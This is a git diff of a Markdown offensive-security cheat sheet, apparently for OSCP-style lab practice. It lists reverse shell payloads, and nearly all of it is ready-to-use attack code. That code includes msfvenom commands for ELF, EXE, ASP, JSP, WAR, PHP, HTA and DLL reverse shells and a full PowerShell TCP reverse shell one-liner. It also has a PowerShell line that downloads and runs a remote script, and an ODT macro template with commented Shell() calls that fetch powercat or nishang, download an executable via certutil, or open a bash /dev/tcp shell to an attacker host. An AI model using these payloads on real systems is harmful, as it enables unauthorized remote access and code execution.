@@ -32,64 +32,73 @@
 
 ## 🔻Reverse shell
 
-#### ➤ Linux - MSFVenom
+#### ➤ .ELF (Linux)
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
-#### SH- MSFVenom
+#### .SH
 ```
 msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > reverse.sh
 ```
 
-#### ➤ Windows - MSFVenom
+#### ➤ .EXE
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
-#### ➤ Powershell
+#### ➤ .PS1 (Powershell - Basic)
 ```
 powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-#### ➤ ASP
+#### ➤ .PS1 (Powershell - Upload and execution)
+```
+# This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
+# Reverse shell : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+# Raw direct link : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
+```
+
+#### ➤ .ASP
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 ```
 
-#### ➤ ASPX
+#### ➤ .ASPX
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
 ```
 
-#### ➤ JSP
+#### ➤ .JSP
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 ```
 
-#### ➤ WAR
+#### ➤ .WAR
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
 ```
 
-#### ➤ PHP
+#### ➤ .PHP
 ```
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
-#### ➤ HTA
+#### ➤ .HTA
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta
 ```
 
-#### ➤ DLL
+#### ➤ .DLL
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
-#### ➤ .so
+#### ➤ .SO
 
 reference : 
 https://routezero.security/2025/02/19/proving-grounds-practice-dev_working-walkthrough/
@@ -158,12 +167,34 @@ Once SUID activated, only perform :
 /bin/bash -p
 ```
 
-#### ➤ Upload and execution
+#### ➤ Macro .ODT
+
+How to create a malicious .ODT macro : 
+https://www.savagehack.com/blog/craft-walkthrough-proving-grounds-offsec
+https://medium.com/@ardian.danny/oscp-practice-series-59-proving-grounds-craft-4b86a013924d
+
+
 ```
-# This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
-# Reverse shell : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
-# Raw direct link : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 443
+Sub Main
+
+    REM Windows POC
+
+    REM POC 01 : This macro download powercat then execute a reverse sheLl. To use it, simply remove the REM flag at the beginning of the next line
+    REM Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://<ATTACKER-IP>/powercat.ps1');powercat -c <ATTACKER-IP> -p <ATTACKER-PORT> -e powershell")
+
+    REM POC 02 : This macro download in memory a reverse shell and execute it
+    REM Shell("cmd /c powershell iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER-IP>:<ATTACKER-PORT>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER-LISTENER-IP> -Port <ATTACKER-LISTENER-PORT>")
+
+    REM POC 03 : Upload a reverse shell.exe into C:\Windows\Temp folder then execute it.
+    REM Shell("cmd /c certutil.exe -urlcache -split -f 'http://<ATTACKER-IP/shell.exe' 'C:\Windows\Temp\shell.exe'")
+	REM Shell("cmd /c 'C:\Windows\Temp\shell.exe'")
+
+    REM Linux POC
+
+    REM POC 01 : This macro execute a bash reverse shell
+    REM Shell("bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1'")
+
+End Sub
 ```
 
 #### ➤ RUNAS (Windows)
